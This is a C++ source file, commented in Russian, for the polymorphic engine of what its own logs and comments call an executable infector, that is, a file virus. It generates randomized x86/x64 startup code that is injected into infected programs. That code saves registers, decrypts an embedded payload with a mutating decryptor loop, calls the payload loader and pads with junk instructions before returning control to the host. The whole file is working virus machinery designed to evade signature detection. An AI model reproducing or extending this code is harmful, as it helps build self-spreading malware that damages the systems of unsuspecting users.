#include "codegen.hpp"
#include "utils.hpp"
#include "trashgen.hpp"

BasicPolymorphicEngine::BasicPolymorphicEngine()
{
#ifdef _DEBUG
	WriteLog(L"[BasicPolymorphicEngine] constructor");
#endif
	this->lpResult = nullptr;
	this->dwResultSize = 0;
	this->encryption = (IEncgen*)new BasicPolymorphicEncryptionAlgorithm;
	this->holdrand = 0;
	this->dnaCode = nullptr;
	this->dwTrashSize = 0;
}

BasicPolymorphicEngine::~BasicPolymorphicEngine()
{
#ifdef _DEBUG
	WriteLog(L"[BasicPolymorhicEngine] destructor");
#endif
	if (this->lpResult != nullptr)
	{
		delete[]this->lpResult;
		this->lpResult = nullptr;
		this->dwResultSize = 0;
	}

	if (this->encryption != nullptr)
		delete this->encryption;
}

BOOL BasicPolymorphicEngine::init(capsid_metadata * capsid, DWORD32 capsidEntryRVA, DWORD32 dwOriginalCallRVA, DWORD32 dwCodePlaceRVA, DWORD dwArch, DWORD dwCodegenSeed, IDNAProcessor *dna)
{
	if ((this->lpResult != nullptr) || (this->dwResultSize))
		return FALSE;

#ifdef _SLOW_POLYMORPHISM
	this->holdrand = dwCodegenSeed;
#else
	this->holdrand = GetTickCount();
#endif

	this->_capsid = capsid;
	this->_capsidEntryRVA = capsidEntryRVA;
	this->_dwOriginalCallRVA = dwOriginalCallRVA;
	this->_dwCodePlaceRVA = dwCodePlaceRVA;
	this->_dwArch = dwArch;
	this->dnaCode = dna;

	return TRUE;
}


DWORD BasicPolymorphicEngine::generate_endcode(LPBYTE lpOutputBuffer, SIZE_T dwBufferSize, DWORD dwArch)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
#endif
	DWORD dwGeneratedSize = 0;
	startup_endcode_types_t setStartupEndCodeType = (startup_endcode_types_t)this->dnaCode->get_value(dna_fields_t::STARTUP_ENDCODE_TYPE, FALSE, 0, startup_endcode_types_t::TOTAL_STARTUPENCODE_TYPES);

	// основной генератор и основной параметр для вызова
	trashgen::ITrashgen *primaryGenerator = nullptr;
	blob primaryParameter;
	RtlSecureZeroMemory(&primaryParameter, sizeof(primaryParameter));

	trashgen::FunctionsLayerTrashParameter *funcParameter = nullptr;
	trashgen::trashgenNonexecutableParameter *nonexecParameter = nullptr;
	trashgen::trashgenDefaultParameter *defaultParameter = nullptr;

	DWORD dwTrashSeed = this->dnaCode->get_value(dna_fields_t::TRASHCODE_PARAM, TRUE, NULL, NULL);

	switch (setStartupEndCodeType)
	{
	case startup_endcode_types_t::ENDCODE_DEFAULTINST:
#ifdef _DEBUG
		WriteLog(L"[exe_infector::generate_endcode] generating using NonExecutableTrash...");
#endif

		primaryGenerator = (trashgen::ITrashgen*)new trashgen::NonExecutableTrash;
		primaryParameter.dwBufSize = sizeof(trashgen::trashgenNonexecutableParameter);
		primaryParameter.lpBuffer = new BYTE[primaryParameter.dwBufSize + 1];
		nonexecParameter = (trashgen::trashgenNonexecutableParameter*)primaryParameter.lpBuffer;
		if (nonexecParameter != nullptr)
		{
			nonexecParameter->type = trashgen::nonexec_types_t::default_instructions;
			nonexecParameter->defaultParam.dwArch = dwArch;
			nonexecParameter->defaultParam.dwSeed = dwTrashSeed;

		}
		break;
	case startup_endcode_types_t::ENDCODE_EMPTY:
#ifdef _DEBUG
		WriteLog(L"[exe_infector::generate_endcode] skipping generation...");
#endif
		break;
	case startup_endcode_types_t::ENDCODE_FPU:
#ifdef _DEBUG
		WriteLog(L"[exe_infector::generate_endcode] generating using FPUExecutableTrashGenerator");
#endif

		primaryGenerator = (trashgen::ITrashgen*)new trashgen::FPUExecutableTrashGenerator;
		primaryParameter.dwBufSize = sizeof(trashgen::trashgenDefaultParameter);
		primaryParameter.lpBuffer = new BYTE[primaryParameter.dwBufSize + 1];
		defaultParameter = (trashgen::trashgenDefaultParameter*)primaryParameter.lpBuffer;
		if (defaultParameter != nullptr)
		{
			defaultParameter->dwArch = dwArch;
			defaultParameter->dwSeed = dwTrashSeed;
		}
		break;
	case startup_endcode_types_t::ENDCODE_FUNCLAYER:
#ifdef _DEBUG
		WriteLog(L"[exe_infector::generate_endcode] generating using FunctionsLayerTrash...");
#endif

		primaryGenerator = (trashgen::ITrashgen*)new trashgen::FunctionsLayerTrash;
		primaryParameter.dwBufSize = sizeof(trashgen::FunctionsLayerTrashParameter);
		primaryParameter.lpBuffer = new BYTE[primaryParameter.dwBufSize + 1];
		funcParameter = (trashgen::FunctionsLayerTrashParameter*)primaryParameter.lpBuffer;
		if (funcParameter != nullptr)
		{
			funcParameter->defaultParam.dwArch = dwArch;
			funcParameter->defaultParam.dwSeed = dwTrashSeed;
			funcParameter->entry = trashgen::funclist_alloc(TRUE, TRUE, dwTrashSeed, dwArch);
		}
		break;
	default:
		break;
	}

	do
	{
		if (primaryGenerator == nullptr)
			break;
		if (primaryParameter.lpBuffer == nullptr)
			break;

		if (!primaryGenerator->init(primaryParameter.lpBuffer, primaryParameter.dwBufSize))
		{
#ifdef _DEBUG
			WriteLog(L"[exe_infector::generate_endcode] cant initialize primary generator");
#endif
			break;
		}

		dwGeneratedSize = primaryGenerator->gen(lpOutputBuffer, dwBufferSize);

#ifdef _DEBUG
		wsprintfW(debugOut, L"[exe_infector::generate_endcode] generated %d bytes", dwGeneratedSize);
		WriteLog(debugOut);
#endif

	} while (FALSE);


	if (primaryGenerator != nullptr)
		delete primaryGenerator;

	if (primaryParameter.lpBuffer != nullptr)
	{
		if (setStartupEndCodeType == startup_endcode_types_t::ENDCODE_FUNCLAYER)
			trashgen::free_linkedlist(funcParameter->entry, TRUE, TRUE);

		delete[]primaryParameter.lpBuffer;
	}

	return dwGeneratedSize;
}


BOOL BasicPolymorphicEngine::gen(LPBYTE * lpOutBuffer, SIZE_T * dwOutSize, PDWORD32 pdwOepReturnRVA)
{
	if ((this->lpResult != nullptr) || (this->dwResultSize))
		return FALSE;

	this->dwTrashSize = this->dnaCode->get_value(dna_fields_t::TRASHCODE_PARAM, FALSE, 16, 1024);
	DWORD dwMaximumSize = 1024 * 10 + dwTrashSize; // 10 кб должно хватить каждому вирусу (С) Билли
	this->dwResultSize = 0;
	this->lpResult = new BYTE[dwMaximumSize + 1];


#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[BasicPolymorphicEngine::gen] generating startup code to be placed rva = 0x%x %s , restore address jump 0x%x, max size = %d, trash size = %d",
		this->_dwCodePlaceRVA, (this->_dwArch == IMAGE_FILE_MACHINE_I386) ? L"x86" : L"x64", this->_dwOriginalCallRVA, dwMaximumSize, dwTrashSize);
	WriteLog(debugOut);
#endif

	BOOL bRet = FALSE;
	do
	{
		// генерирует пролог стартап кода: сохранение регистров
		SIZE_T dwPrologueRVA = this->generate_prologue();
		// генерирует код стартующий лоадер капсида: декриптор капсида и передачу управления
		SIZE_T dwLoaderStarterRVA = this->generate_loader_starter();
		
		// генерирует эпилог стартап кода: патч пролога для перехода на код восстановления (в многопоточной среде иначе может быть краш)
		// + восстановление регистров
		SIZE_T dwEpilogueRVA = this->generate_epilogue();
		// генерирует код восстановления исполнения, передавая управление на оригинальный вызываемый адрес
		SIZE_T dwRestoreExecutionRVA = this->generate_restoration_code();

		// начало restoration code - место для  восстанавливающего трамплина. 
		// Все остальное не исполняется, так как до входа в этот блок будет произведен рантайм патч кода на переход в оригинал функцию
		// так что посчитаем действительный RVA этого кода и вернем это место для последующей записи в структуру по восстановлению
		*pdwOepReturnRVA = (DWORD32)((SIZE_T)this->_dwCodePlaceRVA + (SIZE_T)dwRestoreExecutionRVA);

		bRet = TRUE;

	} while (FALSE);

	if (bRet)
	{
		*lpOutBuffer = this->lpResult;
		*dwOutSize = this->dwResultSize;
	}

	return bRet;
}

IEncgen * BasicPolymorphicEngine::get_encryption()
{
	return this->encryption;
}

long * BasicPolymorphicEngine::get_holdrand_pointer()
{
	return &this->holdrand;
}

SIZE_T BasicPolymorphicEngine::generate_prologue()
{
#ifdef _DEBUG
	WriteLog(L"[BasicPolymorphicEngine::generate_prologue] generating prologue");
#endif
	SIZE_T dwStartCodeDelta = dwResultSize;

	switch (this->_dwArch)
	{
	case IMAGE_FILE_MACHINE_I386: // пушим на стек все регистры
		
		assembler::x86::push_r32(assembler::x86::EAX, lpResult, &dwResultSize);
		assembler::x86::push_r32(assembler::x86::ECX, lpResult, &dwResultSize);
		assembler::x86::push_r32(assembler::x86::EDX, lpResult, &dwResultSize);
		assembler::x86::push_r32(assembler::x86::EBX, lpResult, &dwResultSize);
		assembler::x86::push_r32(assembler::x86::EBP, lpResult, &dwResultSize);
		assembler::x86::push_r32(assembler::x86::ESI, lpResult, &dwResultSize);
		assembler::x86::push_r32(assembler::x86::EDI, lpResult, &dwResultSize);

		break;
	case IMAGE_FILE_MACHINE_AMD64:
		
		assembler::x64::push_general_r64(assembler::x64::RAX, lpResult, &dwResultSize);
		assembler::x64::push_general_r64(assembler::x64::RCX, lpResult, &dwResultSize);
		assembler::x64::push_general_r64(assembler::x64::RDX, lpResult, &dwResultSize);
		assembler::x64::push_general_r64(assembler::x64::RBX, lpResult, &dwResultSize);
		assembler::x64::push_general_r64(assembler::x64::RBP, lpResult, &dwResultSize);
		assembler::x64::push_general_r64(assembler::x64::RSI, lpResult, &dwResultSize);
		assembler::x64::push_general_r64(assembler::x64::RDI, lpResult, &dwResultSize);

		assembler::x64::push_additional_r64(assembler::x64::r8, lpResult, &dwResultSize);
		assembler::x64::push_additional_r64(assembler::x64::r9, lpResult, &dwResultSize);
		assembler::x64::push_additional_r64(assembler::x64::r10, lpResult, &dwResultSize);
		assembler::x64::push_additional_r64(assembler::x64::r11, lpResult, &dwResultSize);
		assembler::x64::push_additional_r64(assembler::x64::r12, lpResult, &dwResultSize);
		assembler::x64::push_additional_r64(assembler::x64::r13, lpResult, &dwResultSize);
		assembler::x64::push_additional_r64(assembler::x64::r14, lpResult, &dwResultSize);
		assembler::x64::push_additional_r64(assembler::x64::r15, lpResult, &dwResultSize);

		// нужно чтобы выделить 0x20 байт для вызываемой функции и выровнять стек + запомнить предыдущее значение
		// UPD: and esp, FFFFFFF0 очень странно себя ведет в том смысле, что обнулило старшие биты rsp регистра, тогда как не должна по-идее их трогать
		// либо я долблюсь в глаза, либо не понимаю, почему оно так себя повело. В итоге с включенным ASLR поинтер стека становится невалидным
		// и поэтому надо делать and rsp, -10h, при том, что and spl, -10h также работает нормально
		// UPD2: оказывается это нормальное поведение для x64 асма - 32-х битные инструкции обнуляют старшие биты........

		/*
		000000004ADF2000 | 55                       | push rbp                                                                           |
		000000004ADF2001 | 48:8BEC                  | mov rbp,rsp                                                                        |
		000000004ADF2004 | 48:83EC 20               | sub rsp,20                                                                         |
		000000004ADF2008 | 83E4 F0                  | and esp,FFFFFFF0 // вот это неверно и тут надо and rsp, -10h                       |
		*/
		lpResult[dwResultSize++] = 0x55;
		lpResult[dwResultSize++] = 0x48;
		lpResult[dwResultSize++] = 0x8B;
		lpResult[dwResultSize++] = 0xEC;
		lpResult[dwResultSize++] = 0x48;
		lpResult[dwResultSize++] = 0x83;
		lpResult[dwResultSize++] = 0xEC;
		lpResult[dwResultSize++] = 0x20;

		// учитывая UPD выше добавим REX-префикс если мы заражаем x64 код, чтобы был and rsp, -10h тогда как на x86 будет and esp, -10h
		if (this->_dwArch == IMAGE_FILE_MACHINE_AMD64)
			lpResult[dwResultSize++] = 0x48;

		lpResult[dwResultSize++] = 0x83;
		lpResult[dwResultSize++] = 0xE4;
		lpResult[dwResultSize++] = 0xF0;

	}

	return dwStartCodeDelta; // дельта начала сгенерированного блока = размер до генерации
}

SIZE_T BasicPolymorphicEngine::generate_loader_starter()
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
	WriteLog(L"[BasicPolymorphicEngine::generate_loader_starter] generating decoder & starter of capsid loader");
#endif

	LPBYTE lpOutBuffer = nullptr;

	// выберем регистр для хранения адреса капсида RAX/EAX RCX/ECX RDX/EDX RBX/EBX
	DWORD uReservedCapsidRegister = _rand(&this->holdrand) % 4;

	SIZE_T dwStartCodeDelta = dwResultSize; // дельта от начала стартового кода

	DWORD32 dwCapsidEntryLoaderRVA = 0;
	DWORD32 dwCurrentRVA = 0;

	// найдем адрес начала капсида, для начала возьмем текущий VA в памяти в рантайме стартап кода
	// зная RVA начала кода и RVA данной инструкции сможем посчитать VA начала капсида
	// VA текущий - дельта от начала стартапа = VA начала стартапа
	// VA начала стартапа -  RVA стартапа = VA базы
	// VA базы + RVA капсида = VA капсида

	DWORD DeltaFromStartupCurrent = 0;
	DWORD dwOperandPreCalc = 0;
	switch (this->_dwArch)
	{
	case IMAGE_FILE_MACHINE_I386:
		dwCapsidEntryLoaderRVA = this->_capsid->offset_x86entry + this->_capsidEntryRVA;
		assembler::x86::save_eip_to_reg((assembler::x86::GENERAL_REGISTERS_T)uReservedCapsidRegister, lpResult, &dwResultSize);
		DeltaFromStartupCurrent = dwResultSize - 1; // это дельта от начала стартап кода до инструкции, VA которой находится в uReservedCapsidRegister
		// эту дельту должны отнять от того, что лежит в uReservedCapsidRegister и получить VA начала стартап кода
		// после чего отнять от этого RVA стартапа и получить VA базы
		// *uReservedCapsidRegister - DeltaFromStartupCurrent - RVAStartup + RVA capsid
		// эту прекалькуляцию константы можем сделать тут, так как она известна
		
		//assembler::x86::sub_r32_imm32((assembler::x86::GENERAL_REGISTERS_T)uReservedCapsidRegister, DeltaFromStartupCurrent, lpResult, &dwResultSize);
		//assembler::x86::sub_r32_imm32((assembler::x86::GENERAL_REGISTERS_T)uReservedCapsidRegister, this->_dwCodePlaceRVA, lpResult, &dwResultSize);
		
		// все знаки на противоположный
		dwOperandPreCalc = (DWORD)(((int)DeltaFromStartupCurrent + (int)this->_dwCodePlaceRVA) - (int)this->_capsidEntryRVA);
		assembler::x86::sub_r32_imm32((assembler::x86::GENERAL_REGISTERS_T)uReservedCapsidRegister, dwOperandPreCalc, lpResult, &dwResultSize);

		break;
	case IMAGE_FILE_MACHINE_AMD64:
		dwCapsidEntryLoaderRVA = this->_capsid->offset_x64entry + this->_capsidEntryRVA;
		// найдем адрес начала капсида
		// для x64 это делается легко - через lea
		// посчитаем наш текущий RVA чтобы потом посчитать rel32 начала капсида и закодировать его в lea
		dwCurrentRVA = (DWORD32)((SIZE_T)dwResultSize + (SIZE_T)this->_dwCodePlaceRVA);
		// 7 - размер инструкции, в dwOperandPreCalc будет лежать rel32 до начала капсида
		dwOperandPreCalc = (DWORD)(this->_capsidEntryRVA - (dwCurrentRVA + 7));
		assembler::x64::lea_reg64_rel32((assembler::x64::GENERAL_REGISTERS_T)uReservedCapsidRegister, dwOperandPreCalc, lpResult, &dwResultSize);

		break;
	}

	
	// ---- генератор декриптора -----
	// декриптор использует наш священный регистр с капсидом, сохраним его на стек
	// сначала также проинициализируем счетчик, его выберем случайным хуеобразом кроме reserved капсида
	// ну и кроме esp с ebp
	UINT uCounterRegister = 0;
	do
	{
		uCounterRegister = _rand(&this->holdrand) % 8; // [0;7] у нас кодируются регистры
	} while ((uCounterRegister == uReservedCapsidRegister) || (uCounterRegister == assembler::x86::GENERAL_REGISTERS_T::ESP) || (uCounterRegister == assembler::x86::GENERAL_REGISTERS_T::EBP));

	// обнулим регистр
	assembler::register_tereshkova_setzero(uCounterRegister, lpResult, &dwResultSize, _dwArch, this->holdrand);

	switch (_dwArch)
	{
	case IMAGE_FILE_MACHINE_I386:
		assembler::x86::push_r32((assembler::x86::GENERAL_REGISTERS_T)uReservedCapsidRegister, lpResult, &dwResultSize);
		break;
	case IMAGE_FILE_MACHINE_AMD64:
		assembler::x64::push_general_r64((assembler::x64::GENERAL_REGISTERS_T)uReservedCapsidRegister, lpResult, &dwResultSize);
		break;
	}

	SIZE_T dwDecryptorSize = 0;
	// дельта от начала старта до декриптора, нужна потом в цикле для jxx
	SIZE_T dwDecryptorDelta = dwResultSize;
	// компилирует IL в расшифровщик блока, нужно вызвать N раз где N = размер капсида / размер блока, после каждого блока надо добавлять к регистру размер блока
	this->encryption->generate_block_decryptor((UINT)uReservedCapsidRegister, &lpOutBuffer, &dwDecryptorSize, _dwArch);
	// сохраним декриптор блока прямо по текущему месту, хотя также можем сгенерировать отдельную функцию для вызова
	_RtlCopyMemory(&lpResult[dwResultSize], lpOutBuffer, dwDecryptorSize);
	dwResultSize += dwDecryptorSize;

	// инкремент счетчика с размером блока
	assembler::add_reg_imm32(uCounterRegister, this->encryption->get_blocksize(), lpResult, &dwResultSize, _dwArch);
	assembler::add_reg_imm32(uReservedCapsidRegister, this->encryption->get_blocksize(), lpResult, &dwResultSize, _dwArch);
	// зациклим декрипт блоков пока регистр не достигнет нужного значения (размера капсида)
	assembler::loop_until_reached(uCounterRegister, this->_capsid->size, dwDecryptorDelta, lpResult, &dwResultSize, _dwArch, this->holdrand);
	
	// --------------------------------
	// у нас на данный момент на стеке лежит указатель на капсид

	// вызовим загрузчик капсида
	// положим на стек адрес начала капсида (UPD: он уже там лежит) и вызовим по заранее известному смещению до RVA зарузчика
	// загрузчик принимает в стеке параметр - указатель на начало капсида, он у нас находится в uReservedCapsidRegister
	switch (_dwArch)
	{
	case IMAGE_FILE_MACHINE_I386:
		// он уже лежит на стеке
		//assembler::x86::push_r32((assembler::x86::GENERAL_REGISTERS_T)uReservedCapsidRegister, lpResult, &dwResultSize);
		break;
	case IMAGE_FILE_MACHINE_AMD64:
		// он уже лежит на стеке нужно лишь восстановить в RCX так как он передается первым параметром
		assembler::x64::pop_general_r64(assembler::x64::GENERAL_REGISTERS_T::RCX, lpResult, &dwResultSize);
		break;
	}

	// RVA текущей инструкции, считается как офсет от начала стартового кода (dwResultSize) + RVA его начала
	// rel32 = rva следующей инструкции - rva цели для перехода
	dwCurrentRVA = (DWORD32)((SIZE_T)dwResultSize + (SIZE_T)this->_dwCodePlaceRVA);
	signed int dwRel32 = dwCapsidEntryLoaderRVA - (dwCurrentRVA + 5);
#ifdef _DEBUG
	wsprintfW(debugOut, L"[BasicPolymorphicEngine::generate_loader_starter] current rva = 0x%x, jumping to 0x%x, rel32 = %i", dwCurrentRVA, dwCapsidEntryLoaderRVA, dwRel32);
	WriteLog(debugOut);
#endif

	assembler::call_rel32(dwRel32, lpResult, &dwResultSize);

	if (lpOutBuffer != nullptr)
		delete[]lpOutBuffer;

	return dwStartCodeDelta;
}

SIZE_T BasicPolymorphicEngine::generate_epilogue()
{
#ifdef _DEBUG
	WriteLog(L"[BasicPolymorphicEngine::generate_epilogue] generating epilogue");
#endif
	SIZE_T dwStartCodeDelta = dwResultSize;

	switch (this->_dwArch)
	{
	case IMAGE_FILE_MACHINE_I386: // восстанавливаем со стека все регистры

		assembler::x86::pop_r32(assembler::x86::EDI, lpResult, &dwResultSize);
		assembler::x86::pop_r32(assembler::x86::ESI, lpResult, &dwResultSize);
		assembler::x86::pop_r32(assembler::x86::EBP, lpResult, &dwResultSize);
		assembler::x86::pop_r32(assembler::x86::EBX, lpResult, &dwResultSize);
		assembler::x86::pop_r32(assembler::x86::EDX, lpResult, &dwResultSize);
		assembler::x86::pop_r32(assembler::x86::ECX, lpResult, &dwResultSize);
		assembler::x86::pop_r32(assembler::x86::EAX, lpResult, &dwResultSize);

		break;
	case IMAGE_FILE_MACHINE_AMD64:

		/*
		000000004ADF200B | 48:8BE5 | mov rsp, rbp |
		000000004ADF200E | 5D | pop rbp |
		*/
		lpResult[dwResultSize++] = 0x48;
		lpResult[dwResultSize++] = 0x8B;
		lpResult[dwResultSize++] = 0xE5;
		lpResult[dwResultSize++] = 0x5D;


		assembler::x64::pop_additional_r64(assembler::x64::r15, lpResult, &dwResultSize);
		assembler::x64::pop_additional_r64(assembler::x64::r14, lpResult, &dwResultSize);
		assembler::x64::pop_additional_r64(assembler::x64::r13, lpResult, &dwResultSize);
		assembler::x64::pop_additional_r64(assembler::x64::r12, lpResult, &dwResultSize);
		assembler::x64::pop_additional_r64(assembler::x64::r11, lpResult, &dwResultSize);
		assembler::x64::pop_additional_r64(assembler::x64::r10, lpResult, &dwResultSize);
		assembler::x64::pop_additional_r64(assembler::x64::r9, lpResult, &dwResultSize);
		assembler::x64::pop_additional_r64(assembler::x64::r8, lpResult, &dwResultSize);

		assembler::x64::pop_general_r64(assembler::x64::RDI, lpResult, &dwResultSize);
		assembler::x64::pop_general_r64(assembler::x64::RSI, lpResult, &dwResultSize);
		assembler::x64::pop_general_r64(assembler::x64::RBP, lpResult, &dwResultSize);
		assembler::x64::pop_general_r64(assembler::x64::RBX, lpResult, &dwResultSize);
		assembler::x64::pop_general_r64(assembler::x64::RDX, lpResult, &dwResultSize);
		assembler::x64::pop_general_r64(assembler::x64::RCX, lpResult, &dwResultSize);
		assembler::x64::pop_general_r64(assembler::x64::RAX, lpResult, &dwResultSize);

	}

	return dwStartCodeDelta; // дельта начала сгенерированного блока = размер до генерации

}

SIZE_T BasicPolymorphicEngine::generate_restoration_code()
{
	CONST UINT iMinimalSize = 5; // минимальный размер требуемый для плейсхолдера
#ifdef _DEBUG
	WriteLog(L"[BasicPolymorphicEngine::generate_epilogue] generating restoration code");
#endif

	SIZE_T dwStartCodeDelta = dwResultSize;
	
	// аллоцируем под плейсхолдер место
	
	DWORD dwGeneratedSize = this->generate_endcode(&lpResult[dwResultSize], this->dwTrashSize, this->_dwArch);
	dwResultSize += dwGeneratedSize;

	// если сгенерированный трэш меньше чем минимальный размер плейсхолдера байтов, то нам надо дописать еще нопы, потому что иначе у нас нет места для записи восстанавливающего трамплина
	if (dwGeneratedSize < iMinimalSize)
	{
		for (UINT iCountNops = 0; iCountNops < (iMinimalSize - dwGeneratedSize); iCountNops++)
		{
			lpResult[dwResultSize++] = 0x90;
		}
	}

	// данный код больше не требуется, так как мы пишем трамплин назад в рантайме - сюда после плейсхолдера можно вписать любой мусор который не исполнится на деле
	/*
	DWORD dwCurrentRVA = (DWORD32)((SIZE_T)dwResultSize + (SIZE_T)this->_dwCodePlaceRVA);
	signed int dwRel32 = this->_dwOriginalCallRVA - (dwCurrentRVA + 5);

	assembler::jmp_rel32(dwRel32, lpResult, &dwResultSize);
	assembler::ret(lpResult, &dwResultSize);
	*/
	return dwStartCodeDelta;
}

void assembler::x64::push_general_r64(GENERAL_REGISTERS_T reg_offset, LPBYTE lpBuffer, PSIZE_T dwIndex)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[assembler::x64] .code:0x%X push /r %d", *dwIndex, reg_offset);
	WriteLog(debugOut);
#endif

	SIZE_T dwOffset = *dwIndex;
	lpBuffer[dwOffset++] = 0x50 + reg_offset; // push /r 
	*dwIndex = dwOffset;
}

void assembler::x64::push_additional_r64(ADDITIONAL_REGISTERS_T reg_offset, LPBYTE lpBuffer, PSIZE_T dwIndex)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[assembler::x64] .code:0x%X push /r additional %d", *dwIndex, reg_offset);
	WriteLog(debugOut);
#endif
	SIZE_T dwOffset = *dwIndex;
	lpBuffer[dwOffset++] = 0x41; // префикс для push указывающий на то что /r - это дополнительный сет регистров
	lpBuffer[dwOffset++] = 0x50 + reg_offset; // push /r 
	*dwIndex = dwOffset;
}

void assembler::x64::pop_general_r64(GENERAL_REGISTERS_T reg_offset, LPBYTE lpBuffer, PSIZE_T dwIndex)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[assembler::x64] .code:0x%X pop /r %d", *dwIndex, reg_offset);
	WriteLog(debugOut);
#endif

	SIZE_T dwOffset = *dwIndex;
	lpBuffer[dwOffset++] = 0x58 + reg_offset; // pop /r 
	*dwIndex = dwOffset;
}

void assembler::x64::pop_additional_r64(ADDITIONAL_REGISTERS_T reg_offset, LPBYTE lpBuffer, PSIZE_T dwIndex)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[assembler::x64] .code:0x%X pop /r additional %d", *dwIndex, reg_offset);
	WriteLog(debugOut);
#endif

	SIZE_T dwOffset = *dwIndex;
	lpBuffer[dwOffset++] = 0x41; // префикс для pop указывающий на то что /r - это дополнительный сет регистров
	lpBuffer[dwOffset++] = 0x58 + reg_offset; // pop /r 
	*dwIndex = dwOffset;
}

void assembler::x64::mov_imm32_to_reg64(GENERAL_REGISTERS_T reg_offset, DWORD imm32, LPBYTE lpBuffer, PSIZE_T dwIndex)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[assembler::x64] .code:0x%X mov /r %d, 0x%x", *dwIndex, reg_offset, imm32);
	WriteLog(debugOut);
#endif

	SIZE_T dwOffset = *dwIndex;

	lpBuffer[dwOffset++] = 0x48;
	lpBuffer[dwOffset++] = 0xC7;
	lpBuffer[dwOffset++] = 0xC0 + reg_offset;

	PDWORD pdwBuffer = (PDWORD)&lpBuffer[dwOffset];
	*pdwBuffer = imm32;
	dwOffset += sizeof(DWORD);

	*dwIndex = dwOffset;
}

void assembler::x64::mov_imm64_to_reg64(GENERAL_REGISTERS_T reg_offset, DWORD64 imm32, LPBYTE lpBuffer, PSIZE_T dwIndex)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[assembler::x64] .code:0x%X mov /r %d, 0x%x", *dwIndex, reg_offset, imm32);
	WriteLog(debugOut);
#endif

	SIZE_T dwOffset = *dwIndex;

	lpBuffer[dwOffset++] = 0x48;
	lpBuffer[dwOffset++] = 0xB8 + reg_offset;

	PDWORD64 pdwBuffer = (PDWORD64)&lpBuffer[dwOffset];
	*pdwBuffer = imm32;
	dwOffset += sizeof(DWORD64);

	*dwIndex = dwOffset;
}

void assembler::x64::lea_reg64_rel32(GENERAL_REGISTERS_T reg_offset, DWORD rel32, LPBYTE lpBuffer, PSIZE_T dwIndex)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[assembler::x64] .code:0x%X lea /r %d, [rip + %i]", *dwIndex, reg_offset, rel32);
	WriteLog(debugOut);
#endif

	SIZE_T dwOffset = *dwIndex;

	lpBuffer[dwOffset++] = 0x48; // 64-bit
	lpBuffer[dwOffset++] = 0x8D; // lea
	lpBuffer[dwOffset++] = 0x05 + ((0x8) * reg_offset); // ну типо принимающий регистр
	
	// rel32, в принимающем регистре будет адрес rip + rel32
	PDWORD32 pdwBuffer = (PDWORD32)&lpBuffer[dwOffset];
	*pdwBuffer = rel32;
	dwOffset += sizeof(rel32);

	*dwIndex = dwOffset;
}

void assembler::x64::save_rip_to_reg(GENERAL_REGISTERS_T reg_offset, LPBYTE lpBuffer, PSIZE_T dwIndex)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[assembler::x64] .code:0x%X call base / base: / pop /r %d", *dwIndex, reg_offset);
	WriteLog(debugOut);
#endif

	// тут мы можем это сделать еще таким способом, как lea r64, [rip] / add r64, *размер add* - это добавлю потом если надо будет
	assembler::call_rel32(0, lpBuffer, dwIndex);
	assembler::x64::pop_general_r64(reg_offset, lpBuffer, dwIndex);
}


void assembler::x86::push_r32(GENERAL_REGISTERS_T reg_offset, LPBYTE lpBuffer, PSIZE_T dwIndex)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[assembler::x86] .code:0x%X push /r %d", *dwIndex, reg_offset);
	WriteLog(debugOut);
#endif

	SIZE_T dwOffset = *dwIndex;
	lpBuffer[dwOffset++] = 0x50 + reg_offset; // push /r 
	*dwIndex = dwOffset;
}

void assembler::x86::pop_r32(GENERAL_REGISTERS_T reg_offset, LPBYTE lpBuffer, PSIZE_T dwIndex)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[assembler::x86] .code:0x%X pop /r %d", *dwIndex, reg_offset);
	WriteLog(debugOut);
#endif

	SIZE_T dwOffset = *dwIndex;
	lpBuffer[dwOffset++] = 0x58 + reg_offset; // pop /r 
	*dwIndex = dwOffset;
}

void assembler::x86::mov_imm32_to_reg32(GENERAL_REGISTERS_T reg_offset, DWORD imm32, LPBYTE lpBuffer, PSIZE_T dwIndex)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[assembler::x86] .code:0x%X mov /r %d, 0%xh", *dwIndex, reg_offset, imm32);
	WriteLog(debugOut);
#endif

	SIZE_T dwOffset = *dwIndex;

	lpBuffer[dwOffset++] = 0xB8 + reg_offset;
	PDWORD pdwBuffer = (PDWORD)&lpBuffer[dwOffset];
	*pdwBuffer = imm32;
	dwOffset += sizeof(DWORD);

	*dwIndex = dwOffset;
}

void assembler::x86::sub_r32_imm32(GENERAL_REGISTERS_T reg_offset, DWORD imm32, LPBYTE lpBuffer, PSIZE_T dwIndex)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[assembler::x86] .code:0x%X sub /r %d, 0%xh", *dwIndex, reg_offset, imm32);
	WriteLog(debugOut);
#endif
	SIZE_T dwOffset = *dwIndex;

	lpBuffer[dwOffset++] = 0x81;
	lpBuffer[dwOffset++] = 0xE8 + reg_offset;

	PDWORD32 pdwBuffer = (PDWORD32)&lpBuffer[dwOffset];
	*pdwBuffer = imm32;
	dwOffset += sizeof(DWORD32);

	*dwIndex = dwOffset;
}

void assembler::x86::save_eip_to_reg(GENERAL_REGISTERS_T reg_offset, LPBYTE lpBuffer, PSIZE_T dwIndex)
{
#ifdef _DEBUG
	WCHAR debugOut[1024];
	wsprintfW(debugOut, L"[assembler::x86] .code:0x%X call base / base: / pop /r %d", *dwIndex, reg_offset);
	WriteLog(debugOut);
#endif

	assembler::call_rel32(0, lpBuffer, dwIndex);
	assembler::x86::pop_r32(reg_offset, lpBuffer, dwIndex);
}


